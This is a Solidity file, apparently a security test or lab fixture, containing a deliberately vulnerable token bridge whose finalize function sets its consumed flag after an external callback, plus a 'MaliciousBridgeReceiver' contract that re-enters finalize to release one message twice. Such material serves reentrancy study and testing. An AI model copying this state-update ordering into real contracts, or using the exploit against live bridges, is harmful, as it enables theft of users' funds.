// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../common/MockERC20.sol";

interface IBridgeReceiver {
    function onBridgeReceive(bytes32 messageId, address token, uint256 amount) external;
}

contract VulnerableBridge {
    MockERC20 public immutable token;
    mapping(bytes32 => bool) public consumed;

    constructor(MockERC20 _token) {
        token = _token;
    }

    function finalize(bytes32 messageId, address receiver, uint256 amount) external {
        require(!consumed[messageId], "consumed");
        token.transfer(receiver, amount);
        if (receiver.code.length > 0) {
            IBridgeReceiver(receiver).onBridgeReceive(messageId, address(token), amount);
        }
        // BUG: consumed flag is set after external callback.
        consumed[messageId] = true;
    }
}

contract MaliciousBridgeReceiver is IBridgeReceiver {
    VulnerableBridge public bridge;
    bytes32 public id;
    uint256 public amount;
    bool public reentered;

    constructor(VulnerableBridge _bridge) {
        bridge = _bridge;
    }

    function attack(bytes32 messageId, uint256 releaseAmount) external {
        id = messageId;
        amount = releaseAmount;
        bridge.finalize(messageId, address(this), releaseAmount);
    }

    function onBridgeReceive(bytes32, address, uint256) external {
        if (!reentered) {
            reentered = true;
            bridge.finalize(id, address(this), amount);
        }
    }
}
